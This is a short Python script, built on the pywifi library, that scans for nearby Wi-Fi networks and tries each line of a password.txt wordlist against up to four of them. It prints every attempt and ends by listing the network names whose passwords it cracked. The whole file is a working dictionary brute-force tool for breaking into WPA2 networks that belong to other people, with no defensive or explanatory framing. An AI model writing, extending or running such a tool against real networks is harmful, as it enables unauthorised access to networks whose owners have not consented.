import pywifi
from pywifi import const 
import time
namelist = []
ssidlist = []
result = []
wificount = 5

def getwifi():
	wifi = pywifi.PyWiFi()
	ifaces = wifi.interfaces()[0] 
	ifaces.scan()
	time.sleep(8)
	bessis = ifaces.scan_results()
	list = []
	for data in bessis:
		if (data.ssid not in namelist):
			namelist.append(data.ssid)
			list.append((data.ssid,data.signal))
	sorted(list, key = lambda st: st[1], reverse = True)
	time.sleep(1)
	n=0
	if len(list) is not 0:
		for item in list:
			if(item[0] not in ssidlist):
				n = n+1
				if n < wificount:
					ssidlist.append(item[0])
	print(ssidlist)
def testwifi(ssidname,password):
	wifi=pywifi.PyWiFi()
	ifaces=wifi.interfaces()[0]
	ifaces.disconnect()#
	profile=pywifi.Profile()#
	profile.ssid=ssidname#wifissid
	profile.auth=const.AUTH_ALG_OPEN#
	profile.akm.append(const.AKM_TYPE_WPA2PSK)#wif
	profile.cipher=const.CIPHER_TYPE_CCMP##
	profile.key=password #wifi
	ifaces.remove_all_network_profiles()#
	tmp_profile=ifaces.add_network_profile(profile)#
	ifaces.connect(tmp_profile)#wifi
	time.sleep(5)#5
	if ifaces.status()==const.IFACE_CONNECTED:
		return True
	else:
	#print("[-]WiFi connection failure!")
		return False
	#ifaces.disconnect()
	##time.sleep(1)
	return True
def main():
	getwifi()
	#ssidlist = ['Oun'] #
	if(len(ssidlist) is not 0):
		path=r"password.txt"
		files=open(path,'r')
		while True:
			if(len(ssidlist) is 0):
				break
			try:
				password =files.readline()
				password=password.strip('\n')
				if not password:
					break
				for item in result:
					ssidlist.remove(item[0])
				for ssidname in ssidlist:
					if(testwifi(ssidname,password)==True):
						result.append((ssidname,password))
						print('Succ','Current WifiName:',ssidname,'Current Password:',password)
					else:
						print('Fail','Current WifiName:',ssidname,'Current Password:',password)
			except:
				continue
		files.close()
		print("\n","WIFI_list:")
		for item in result: #
			print("")
			print("WiFi:",item[0])
			print("code:",item[1])
	else:
		print("not found，retry again。")
if __name__ == '__main__':
	main()